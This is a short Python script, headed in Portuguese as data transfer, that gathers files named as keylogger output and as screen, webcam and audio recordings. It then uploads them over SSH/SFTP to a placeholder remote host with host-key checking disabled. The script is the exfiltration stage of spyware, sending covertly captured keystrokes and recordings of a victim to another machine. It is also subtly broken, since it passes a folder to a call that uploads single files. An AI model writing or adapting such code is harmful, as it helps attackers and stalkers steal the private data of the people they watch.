#Transferencia de dado

import os
import paramiko
import shutil

# Create a folder to store the recorded data
data_folder = "recorded_data"
os.makedirs(data_folder, exist_ok=True)

# Save the recorded data to the folder
# (Replace the file paths with the actual file paths of the recorded data)
shutil.copy("keylogger.txt", data_folder)
shutil.copy("screen_recordings.avi", data_folder)
shutil.copy("webcam_recordings.avi", data_folder)
shutil.copy("audio_recordings.wav", data_folder)

# Connect to the remote computer using SSH
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect("remote_computer_address", username="username", password="password")

# Transfer the folder to the remote computer
sftp = ssh.open_sftp()
sftp.put(data_folder, "/path/to/remote/folder")

# Close the SSH connection
sftp.close()
ssh.close()